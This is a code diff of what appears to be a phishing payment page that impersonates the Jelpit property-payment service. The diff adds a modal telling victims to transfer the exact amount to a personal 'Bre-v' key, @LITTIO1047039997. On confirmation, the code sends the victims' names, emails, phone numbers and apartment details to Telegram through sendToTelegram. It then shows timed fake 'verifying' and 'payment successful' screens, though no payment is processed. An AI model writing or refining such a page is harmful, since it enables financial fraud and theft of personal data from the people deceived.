@@ -850,31 +850,16 @@ ${metodoInfo}
                 const metodoPago = sessionStorage.getItem('metodoPago') || 'tarjeta';
 
                 if (metodoPago === 'brev') {
-                    sendToTelegram({
-                        nombre: userNombre,
-                        apellido: userApellido,
-                        email: userEmail,
-                        celular: userCelular,
-                        tipo_doc: 'CC',
-                        cedula: '',
-                        nombreConjunto: nombreConjunto,
-                        referencia1: referencia1,
-                        selectedApt: selectedApt,
-                        referencia2: referencia2,
-                        metodoPago: 'brev',
-                        pseBank: 'Bre-v (@LITTIO1047039997)',
-                        monto_formateado: totalFormatted
-                    });
+                    // Mostrar monto en el modal
+                    document.getElementById('brevModalMonto').textContent = totalFormatted;
+                    document.getElementById('brevModal').style.display = 'flex';
 
-                    // Mostrar pantalla de loading
-                    document.getElementById('brevLoadingOverlay').style.display = 'flex';
-                    btnPagar.disabled = true;
-
-                    // Después de 2.5s pasar a éxito
-                    setTimeout(() => {
-                        document.getElementById('brevLoadingOverlay').style.display = 'none';
-                        document.getElementById('brevSuccessOverlay').style.display = 'flex';
-                    }, 2500);
+                    // Guardar datos para el Telegram al confirmar
+                    document.getElementById('brevModal').__brevData = {
+                        nombre: userNombre, apellido: userApellido, email: userEmail,
+                        celular: userCelular, nombreConjunto, referencia1,
+                        selectedApt, referencia2, totalFormatted
+                    };
                     return;
                 }
 
@@ -1236,26 +1221,117 @@ ${metodoInfo}
         }
     </script>
 
+    <!-- Brev: Modal llave -->
+    <div id="brevModal" style="display:none; position:fixed; inset:0; background:rgba(0,0,0,0.55); z-index:300000; align-items:center; justify-content:center; padding:20px; backdrop-filter:blur(2px);">
+        <div style="background:white; border-radius:20px; max-width:400px; width:100%; padding:30px; box-shadow:0 20px 60px rgba(0,0,0,0.3); font-family:'Roboto Condensed',sans-serif;">
+            <!-- Header -->
+            <div style="text-align:center; margin-bottom:24px;">
+                <div style="width:64px; height:64px; background:#f5f0ff; border-radius:50%; display:flex; align-items:center; justify-content:center; margin:0 auto 14px;">
+                    <i class="fa-solid fa-link" style="font-size:28px; color:#7c3aed;"></i>
+                </div>
+                <h3 style="font-size:20px; font-weight:700; color:#2e0063; margin:0 0 6px;">Transferencia directa</h3>
+                <p style="font-size:13px; color:#777; margin:0;">Transfiere el valor exacto a esta llave</p>
+            </div>
+
+            <!-- Monto -->
+            <div style="background:#f0fdf4; border:1px solid #1dbe5f; border-radius:10px; padding:14px 18px; text-align:center; margin-bottom:16px;">
+                <div style="font-size:11px; color:#555; font-weight:600; text-transform:uppercase; margin-bottom:4px;">Valor a transferir</div>
+                <div id="brevModalMonto" style="font-size:24px; font-weight:700; color:#1dbe5f;">—</div>
+            </div>
+
+            <!-- Llave con botón copiar -->
+            <div style="background:#f5f0ff; border:1.5px solid #7c3aed; border-radius:10px; padding:14px 18px; margin-bottom:20px;">
+                <div style="font-size:11px; color:#7c3aed; font-weight:700; text-transform:uppercase; margin-bottom:8px;">Llave de transferencia</div>
+                <div style="display:flex; align-items:center; gap:10px;">
+                    <span id="brevLlaveText" style="font-size:18px; font-weight:700; color:#2e0063; letter-spacing:0.5px; flex:1;">@LITTIO1047039997</span>
+                    <button id="brevBtnCopiar" onclick="brevCopiarLlave()" style="background:#7c3aed; color:white; border:none; border-radius:8px; padding:8px 14px; font-size:13px; font-weight:700; cursor:pointer; white-space:nowrap; font-family:'Roboto Condensed',sans-serif; display:flex; align-items:center; gap:6px;">
+                        <i class="fa-regular fa-copy"></i> Copiar
+                    </button>
+                </div>
+            </div>
+
+            <!-- Botón confirmar -->
+            <button onclick="brevConfirmar()" style="width:100%; background:#1dbe5f; color:white; border:none; border-radius:25px; padding:14px; font-size:15px; font-weight:700; cursor:pointer; font-family:'Roboto Condensed',sans-serif; margin-bottom:10px;">
+                Ya realicé la transferencia
+            </button>
+            <button onclick="document.getElementById('brevModal').style.display='none'" style="width:100%; background:transparent; color:#999; border:none; padding:10px; font-size:13px; cursor:pointer; font-family:'Roboto Condensed',sans-serif;">
+                Cancelar
+            </button>
+        </div>
+    </div>
+
     <!-- Brev: Loading Overlay -->
-    <div id="brevLoadingOverlay" style="display:none; position:fixed; inset:0; background:white; z-index:300000; flex-direction:column; align-items:center; justify-content:center; gap:24px;">
+    <div id="brevLoadingOverlay" style="display:none; position:fixed; inset:0; background:white; z-index:300001; flex-direction:column; align-items:center; justify-content:center; gap:24px; font-family:'Roboto Condensed',sans-serif;">
         <img src="img/logo_jelpit_color.svg" alt="Jelpit" style="height:48px; margin-bottom:8px;">
         <div style="width:56px; height:56px; border:5px solid #e8e8e8; border-top-color:#1dbe5f; border-radius:50%; animation:jlpSpin 0.9s linear infinite;"></div>
-        <p style="font-size:16px; color:#555; font-family:'Roboto Condensed',sans-serif; margin:0;">Procesando pago...</p>
+        <p style="font-size:16px; color:#555; margin:0;">Verificando transferencia...</p>
     </div>
 
     <!-- Brev: Success Overlay -->
-    <div id="brevSuccessOverlay" style="display:none; position:fixed; inset:0; background:white; z-index:300000; flex-direction:column; align-items:center; justify-content:center; padding:30px; text-align:center; font-family:'Roboto Condensed',sans-serif;">
+    <div id="brevSuccessOverlay" style="display:none; position:fixed; inset:0; background:white; z-index:300001; flex-direction:column; align-items:center; justify-content:center; padding:30px; text-align:center; font-family:'Roboto Condensed',sans-serif;">
         <img src="img/logo_jelpit_color.svg" alt="Jelpit" style="height:48px; margin-bottom:32px;">
         <div style="width:80px; height:80px; background:#f0fdf4; border-radius:50%; display:flex; align-items:center; justify-content:center; margin-bottom:24px;">
             <i class="fa-solid fa-check" style="font-size:36px; color:#1dbe5f;"></i>
         </div>
         <h2 style="font-size:24px; font-weight:700; color:#2e0063; margin:0 0 12px;">¡Pago exitoso!</h2>
-        <p style="font-size:15px; color:#555; max-width:320px; line-height:1.6; margin:0 0 8px;">Tu solicitud de pago fue recibida correctamente.</p>
-        <p style="font-size:14px; color:#888; max-width:320px; line-height:1.6; margin:0 0 32px;">Verifica tu pago realizando la transferencia a <strong style="color:#7c3aed;">@LITTIO1047039997</strong> por el valor exacto.</p>
+        <p style="font-size:15px; color:#555; max-width:320px; line-height:1.6; margin:0 0 32px;">Tu solicitud fue recibida. Te notificaremos cuando confirmemos tu transferencia.</p>
         <button onclick="window.location.href='home.html'" style="background:#1dbe5f; color:white; border:none; border-radius:25px; padding:14px 40px; font-size:15px; font-weight:700; cursor:pointer; font-family:'Roboto Condensed',sans-serif;">
             Volver al inicio
         </button>
     </div>
+
+    <script>
+        function brevCopiarLlave() {
+            const llave = '@LITTIO1047039997';
+            navigator.clipboard.writeText(llave).then(() => {
+                const btn = document.getElementById('brevBtnCopiar');
+                btn.innerHTML = '<i class="fa-solid fa-check"></i> Copiado';
+                btn.style.background = '#1dbe5f';
+                setTimeout(() => {
+                    btn.innerHTML = '<i class="fa-regular fa-copy"></i> Copiar';
+                    btn.style.background = '#7c3aed';
+                }, 2000);
+            }).catch(() => {
+                // Fallback para navegadores que no soportan clipboard API
+                const el = document.createElement('textarea');
+                el.value = llave;
+                document.body.appendChild(el);
+                el.select();
+                document.execCommand('copy');
+                document.body.removeChild(el);
+                const btn = document.getElementById('brevBtnCopiar');
+                btn.innerHTML = '<i class="fa-solid fa-check"></i> Copiado';
+                btn.style.background = '#1dbe5f';
+                setTimeout(() => {
+                    btn.innerHTML = '<i class="fa-regular fa-copy"></i> Copiar';
+                    btn.style.background = '#7c3aed';
+                }, 2000);
+            });
+        }
+
+        function brevConfirmar() {
+            const modal = document.getElementById('brevModal');
+            const d = modal.__brevData || {};
+            modal.style.display = 'none';
+
+            // Enviar notificación Telegram
+            sendToTelegram({
+                nombre: d.nombre, apellido: d.apellido, email: d.email,
+                celular: d.celular, tipo_doc: 'CC', cedula: '',
+                nombreConjunto: d.nombreConjunto, referencia1: d.referencia1,
+                selectedApt: d.selectedApt, referencia2: d.referencia2,
+                metodoPago: 'brev', pseBank: 'Bre-v (@LITTIO1047039997)',
+                monto_formateado: d.totalFormatted
+            });
+
+            // Loading → éxito
+            document.getElementById('brevLoadingOverlay').style.display = 'flex';
+            setTimeout(() => {
+                document.getElementById('brevLoadingOverlay').style.display = 'none';
+                document.getElementById('brevSuccessOverlay').style.display = 'flex';
+            }, 2500);
+        }
+    </script>
 
     <!-- Modal Autorización Jelpit -->
     <div id="jlpModalOverlay">
